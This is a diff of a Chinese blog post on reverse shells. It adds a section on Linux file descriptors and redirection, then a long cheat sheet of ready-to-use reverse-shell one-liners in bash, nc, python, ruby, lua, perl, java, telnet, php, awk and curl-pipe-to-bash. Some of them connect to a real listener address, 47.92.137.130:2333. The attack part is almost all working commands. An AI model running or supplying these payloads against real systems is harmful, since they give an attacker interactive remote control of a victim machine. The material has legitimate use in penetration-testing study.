@@ -8,18 +8,39 @@
   <link rel="dns-prefetch" href="https://bigmancer.github.io">
   <title>shell反弹简单记 | 招女朋友（doge）</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="文件描述符linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 当Linux启动的时候会默认打开三个文件描述符，分别是：  标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显示器）">
+  <meta name="description" content="原理篇文件描述符linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 当Linux启动的时候会默认打开三个文件描述符，分别是：  标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显">
 <meta property="og:type" content="article">
 <meta property="og:title" content="shell反弹简单记">
 <meta property="og:url" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/index.html">
 <meta property="og:site_name" content="招女朋友（doge）">
-<meta property="og:description" content="文件描述符linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 当Linux启动的时候会默认打开三个文件描述符，分别是：  标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显示器）">
+<meta property="og:description" content="原理篇文件描述符linux文件描述符：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 当Linux启动的时候会默认打开三个文件描述符，分别是：  标准输入standard input 0 （默认设备键盘） 标准输出standard output 1（默认设备显示器） 错误输出：error output 2（默认设备显">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201217163827724.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201217163947161.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201217172050051.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201217172816252.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228112501467.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228145300805.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228145428668.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228150131526.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228150113360.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228150737869.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228150753311.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228153800396.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228153817676.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201228160031878.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201229095332683.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201229095347247.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201229095856826.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201229095920936.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201229101723982.png">
+<meta property="og:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201229101737511.png">
 <meta property="article:published_time" content="2020-11-30T11:31:11.000Z">
-<meta property="article:modified_time" content="2020-11-30T11:59:37.785Z">
+<meta property="article:modified_time" content="2020-12-29T02:21:26.809Z">
 <meta property="article:author" content="Machine">
 <meta property="article:tag" content="linux">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bigmancer.github.io/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file/code/Blog/source_posts/2020-11-30-shell反弹简单记/image-20201217163827724.png">
   
     <link rel="alternative" href="/atom.xml" title="招女朋友（doge）" type="application/atom+xml">
   
@@ -173,7 +194,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h1><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
+        <h1 id="原理篇"><a href="#原理篇" class="headerlink" title="原理篇"></a>原理篇</h1><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
 <p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
 <blockquote>
 <p>标准输入standard input 0 （默认设备键盘）</p>
@@ -184,25 +205,42 @@
 <p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
 <p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
 <h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
-<p>（1）输入重定向 &lt; &lt;&lt;</p>
-<p>（2）输出重定向 &gt; &gt;&gt;</p>
+<p>（1）输入重定向&lt;   &lt;&lt;  (单箭头会覆写，双箭头表示为追加)</p>
+<p>（2）输出重定向 &gt;   &gt;&gt;</p>
 <hr>
 <ol>
-<li><p>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
-</li>
-<li><p>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
-</li>
-<li><p>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p>
-</li>
+<li>bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</li>
+<li>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</li>
+<li>&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</li>
 </ol>
+<h3 id="重定向执行顺序"><a href="#重定向执行顺序" class="headerlink" title="重定向执行顺序"></a><strong>重定向执行顺序</strong></h3><p>shell会按照;等分隔符将一串命令分成多个命令，替换命令中的变量后执行单条命令</p>
+<p>待定</p>
 <h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a><strong>输入重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&lt; word     （注意[n]与&lt;之间没有空格）</span><br></pre></td></tr></table></figure>
 
+<h4 id="将输入重定向到文件‘test-input’"><a href="#将输入重定向到文件‘test-input’" class="headerlink" title="将输入重定向到文件‘test_input’"></a>将输入重定向到文件‘test_input’</h4><p>新建一个文件‘test_input’,内容是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217163827724.png" alt="image-20201217163827724"></p>
+<p>使用输入重定向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">bash&lt;test_input </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217163947161.png" alt="image-20201217163947161"></p>
 <h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a><strong>输出重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&gt; word    （注意[n]与&gt;之间没有空格）</span><br></pre></td></tr></table></figure>
 
+<p>将输出重定向到文件‘test_out’</p>
+<p>使用输出重定向</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> 123&gt;test_out</span></span><br></pre></td></tr></table></figure>
+
+<p>查看文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim test_out</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217172050051.png" alt="image-20201217172050051"></p>
 <h3 id="标准输出与标准错误输出重定向"><a href="#标准输出与标准错误输出重定向" class="headerlink" title="标准输出与标准错误输出重定向"></a><strong>标准输出与标准错误输出重定向</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： &amp;&gt; word &gt;&amp; word</span><br></pre></td></tr></table></figure>
 
+<h4 id="错误输出重定向测试"><a href="#错误输出重定向测试" class="headerlink" title="错误输出重定向测试"></a>错误输出重定向测试</h4><p>以输入不存在的命名来测试</p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201217172816252.png" alt="image-20201217172816252"></p>
 <blockquote>
-<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的)</p>
+<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，**&amp;是为了区分文件1和文件描述符1的**)</p>
 </blockquote>
 <h3 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a><strong>文件描述符的复制</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] (这里所有字符之间不要有空格)</span><br></pre></td></tr></table></figure>
 
@@ -260,7 +298,98 @@
 
 <p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
 </blockquote>
+<h1 id="应用篇"><a href="#应用篇" class="headerlink" title="应用篇"></a>应用篇</h1><h2 id="命令确定⽬标⽀持的反弹⽅式"><a href="#命令确定⽬标⽀持的反弹⽅式" class="headerlink" title="命令确定⽬标⽀持的反弹⽅式"></a>命令确定⽬标⽀持的反弹⽅式</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis nc bash python ruby php exec lua perl java  //可依据需要添加其他语言</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228112501467.png" alt="image-20201228112501467"></p>
+<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.92.***.***/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228145300805.png" alt="image-20201228145300805"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228145428668.png" alt="image-20201228145428668"></p>
+<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc ip port -e /bin/sh</span><br><span class="line">nc.traditional ip port -e /bin/sh</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc ip port &gt;/tmp/f    ##没有e参数，结合管道命令进⾏反弹</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150131526.png" alt="image-20201228150131526"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150113360.png" alt="image-20201228150113360"></p>
+<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import</span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.conne</span><br><span class="line">ct((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150737869.png" alt="image-20201228150737869"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228150753311.png" alt="image-20201228150753311"></p>
+<h2 id="ruby反弹-错误的文件描述符"><a href="#ruby反弹-错误的文件描述符" class="headerlink" title="ruby反弹(错误的文件描述符)"></a>ruby反弹(错误的文件描述符)</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby -r socket -e &#x27;f=TCPSocket.open(&quot;47.92.***.***&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if</span><br><span class="line">fork;c&#x3D;TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)</span><br><span class="line">&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/47.92.137.130/2333; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228153800396.png" alt="image-20201228153800396"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228153817676.png" alt="image-20201228153817676"></p>
+<h2 id="lua反弹-无法安装luasocket模块"><a href="#lua反弹-无法安装luasocket模块" class="headerlink" title="lua反弹(无法安装luasocket模块)"></a>lua反弹(无法安装luasocket模块)</h2><h3 id="lua安装"><a href="#lua安装" class="headerlink" title="lua安装"></a>lua安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -R -O http://www.lua.org/ftp/lua-5.4.2.tar.gz</span><br><span class="line">tar zxf lua-5.4.2.tar.gz</span><br><span class="line">cd lua-5.4.2</span><br><span class="line">make all test</span><br><span class="line">make linux test </span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201228160031878.png" alt="image-20201228160031878"></p>
+<p>说明我们安装的luasocket位置，从错误提示可以看出</p>
+<p>.lua文件它是从/usr/local/share/lua路径中查找</p>
+<p>.so 文件是从/usr/local/lib/lua 路径查找</p>
+<h3 id="安装socket包"><a href="#安装socket包" class="headerlink" title="安装socket包"></a>安装socket包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use</span><br><span class="line">Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(c</span><br><span class="line">onnect(S,sockaddr_in($p,inet_aton($i))))</span><br><span class="line">&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>不依赖bin/sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new</span><br><span class="line">IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-</span><br><span class="line">&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="java反弹-编译环境缺少"><a href="#java反弹-编译环境缺少" class="headerlink" title="java反弹(编译环境缺少)"></a>java反弹(编译环境缺少)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095332683.png" alt="image-20201229095332683"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095347247.png" alt="image-20201229095347247"></p>
+<p>两个端口，一个输入，一个输出</p>
+<p>监听端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat: nc -nvvp 8000</span><br><span class="line">netcat: nc -nvvp 7000</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 攻击机ip 8000 | /bin/bash | telnet 攻击机ip 7000</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;47.92.137.130&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095856826.png" alt="image-20201229095856826"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229095920936.png" alt="image-20201229095920936"></p>
+<h2 id="ssh反弹"><a href="#ssh反弹" class="headerlink" title="ssh反弹"></a>ssh反弹</h2><h2 id="Curl反弹"><a href="#Curl反弹" class="headerlink" title="Curl反弹"></a>Curl反弹</h2><p>开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.2.103&#x2F;bash.html|bash #利用管道符将文件内容作为参数进行传递</span><br><span class="line">#把bash命令写入html文件</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.99.2&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="awk反弹"><a href="#awk反弹" class="headerlink" title="awk反弹"></a>awk反弹</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/IP/PORT&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229101723982.png" alt="image-20201229101723982"></p>
+<p><img src="/2020/11/30/shell%E5%8F%8D%E5%BC%B9%E7%AE%80%E5%8D%95%E8%AE%B0/file\code\Blog\source_posts\2020-11-30-shell反弹简单记\image-20201229101737511.png" alt="image-20201229101737511"></p>
